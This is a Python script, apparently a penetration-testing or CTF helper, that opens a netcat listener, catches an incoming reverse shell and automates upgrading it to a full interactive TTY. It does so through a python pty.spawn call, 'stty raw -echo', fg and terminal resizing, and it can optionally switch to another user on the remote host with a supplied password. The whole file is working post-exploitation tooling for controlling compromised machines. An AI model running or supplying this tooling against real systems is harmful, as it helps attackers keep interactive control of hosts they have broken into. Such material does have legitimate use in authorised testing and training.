#!/bin/python3
import os
import pexpect
import time
from termcolor import colored, cprint
import argparse



#COLORS
#Python program to print 
# colored text and background 
def prRed(skk): print("\033[91m {}\033[00m" .format(skk)) 
def prPink(skk): print("\033[45m{}\033[00m".format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk)) 
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk)) 
def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk)) 
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk)) 
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk)) 
def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk)) 
def prBlack(skk): print("\033[98m {}\033[00m" .format(skk)) 
def prHighLight(skk): print("\033[103m {}\033[00m" .format(skk))


#VARIABLES
desc = '''

@Creator

🅛 🅤 🅒 🅚 🅨 - 🅣 🅗 🅐 🅝 🅓 🅔 🅛

    '''
child = pexpect.spawn("/bin/bash", encoding='utf-8', timeout=None)
time_wait = 2

# Define Port
def port_define():
    global port
    
    parser = argparse.ArgumentParser(description=desc)
    parser.add_argument("-p", "--port", type=str, help="Listening Port")
    args = parser.parse_args()
    port = args.port
    if port == None:
        print("[\033[93m?\033[00m] port: " ,end='')
        port = input()
        if len(port) == 0:
            prRed("Not Valid\n")
            port_define()
        os.system("clear")
    

#Terminal window size match
def terminal_size(arg2):
    
    ask_size = input("Costmize Terminal Size (Y/N): ")
    if ask_size.lower() == "y":
        prCyan("\nRecommended size ==> rows: 40 , cols: 150")
        row_size = input("Rows: ")
        col_size = input("Columns: ")
        if len(row_size) + len(col_size) == 0:
            prRed("\nWrong Input, Try Again\n")
            terminal_size(arg2)
        elif row_size.isalpha() or col_size.isalpha():
            
            prRed("\nWrong Input, Try Again\n")
            print("2")
            terminal_size(arg2)
        else:
            arg2.sendline(f"stty rows {row_size} cols {col_size}")
            ask_for_user(arg2)
    elif ask_size.lower() == "n":
        ask_for_user(arg2)
        arg2.interact()
    else:
        prRed("\nWrong Input, Try Again\n")
        terminal_size(arg2)

#Takeover Shell
def take_control(proc):
    
    proc.expect("from")
    os.system("clear")
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)
    prGreen(f"\nConnection Established At {current_time}\n")
    prPurple('''
        "Y" : Manual
        "N" : Automate
            ''')
    python_control = input("Do you want to choose commands before executing(Y/N): ")
    if python_control.lower() == 'y':
        
        prYellow('''
                       ---- Choose [1,2] ----
        (1). python -c 'import pty; pty.spawn("/bin/bash")'
        (2). python3 -c 'import pty; pty.spawn("/bin/bash")'
        ''')
        ques1 = input("==> ")
        
        if ques1 == "1":

            proc.sendline("python -c 'import pty; pty.spawn(\"/bin/bash\")'")
            questions(proc)
        
        elif ques1 == "2":

            proc.sendline("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
            questions(proc)

    elif python_control.lower() == 'n':
        
        try:
        
            proc.sendline("python -c 'import pty;pty.spawn(\"/bin/bash\")'")
            proc.expect("@", timeout=5)
            proc.sendcontrol("z")
            proc.sendline("stty raw -echo")
            proc.sendline("fg")
            time.sleep(time_wait)
            proc.sendline("reset xterm-256color")
            time.sleep(time_wait)
            proc.sendline("export TERM=xterm")
            os.system("clear")
            terminal_size(proc)
            

        except:

            proc.sendline("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
            proc.expect("@", timeout=5)
            proc.sendcontrol("z")
            proc.sendline("stty raw -echo")
            proc.sendline("fg")
            time.sleep(time_wait)
            proc.sendline("reset xterm-256color")
            time.sleep(time_wait)
            proc.sendline("export TERM=xterm")
            os.system("clear")
            proc.sendline("clear")
            terminal_size(proc)        
        else:

            prRed("Python2 And Python3 Are Not Available On Remote Host")
            exit(0)
    else:
        prRed("wrong Input")
        proc.interact()


def ask_for_user(arg1):

    prLightPurple("\nSudo with user:(Y/N)")
    user_present = input("==> ")
    
    if user_present.lower() == "y":
        username = input("\nUsername: ")
        password = input("Password: ")
        if len(username) == 0:
            prRed("Username not found\nTryAain\n")
            ask_for_user(arg1)
        elif len(password) == 0:
            prRed("Password not found\nTryAain\n")
            ask_for_user(arg1)
        else:
            arg1.sendline(f"su - {username}")
            i3 = arg1.expect(["su: user king does not exist", "Password:"])
            if i3 == 0:
                prRed(f"\nuser {username} does not exist\n")
                ask_for_user(arg1)
            elif i3 == 1:
                arg1.sendline(password)
                i4 = arg1.expect(["failure", "@"])
                if i4 == 0:
                   prRed("\nIncorrect Password\n")
                   ask_for_user(arg1)
                elif i4 == 1:
                    prGreen(f"Logged in as {username}")
                    arg1.interact()
                else:
                    prRed("\nTry Again\n")
                    ask_for_user(arg1)
            else:
                prRed("Something went wrong!")
                arg1.interact()
    elif user_present.lower() == "n":
        arg1.interact()
       

def main():
    
    prPink("@Luckythandel")
    child.sendline(f"nc -lvp {port}")
    rev_shell = f"\nListener Started At Port {port} "
    cprint(rev_shell, 'red', attrs=['blink', 'bold'])
    take_control(child)
    return 0
    
def questions(proc2):
    
    time.sleep(time_wait)
    prYellow('''
    Run: stty raw -echo (Y/N)
    ''')
    ques0 = input("==> ")
    if ques0.lower() == "y":
        
        proc2.sendcontrol('z')
        time.sleep(time_wait)
        proc2.sendline("stty raw -echo")
        prYellow('''
        Run: fg AND reset (Y/N)
        ''')
        ques2 = input("==> ")
        
        if ques2.lower() == "y":
            
            proc2.sendline("fg")
            time.sleep(time_wait)
            proc2.sendline("reset")
            
            prYellow('''
            Display color setting: xterm-256color (Y/N)
            ''')
            ques3 = input("==> ")
            
            if ques3.lower() == "y":
                
                proc2.sendline("xterm-256color")    
                prYellow("Run: export TERM=xterm (Y/N)")
                ques4 = input("==> ")
                
                if ques4.lower() == "y":
                    
                    proc2.sendline("export TERM=xterm")
                    terminal_size(proc2)
                    proc2.interact()
                
                elif ques4.lower() == "n":
    
                    proc2.interact()
            
            elif ques3.lower() == "n":
                
                proc2.interact()
        
        elif ques2.lower() == "n":    
            
            prCyan('''
                You choosed to exit. But your the reverse shell is still running
                Get back to Remote shell with "fg" command.
                ''')
            proc2.interact()    
        
        elif ques0.lower() == "n":
            
            prYellow("Leaving...")
            proc2.interact()
    elif ques0.lower() == "n":
        ask_for_user(proc2)
        proc2.interact()


#RUN IT
os.system('clear')
port_define()
main()

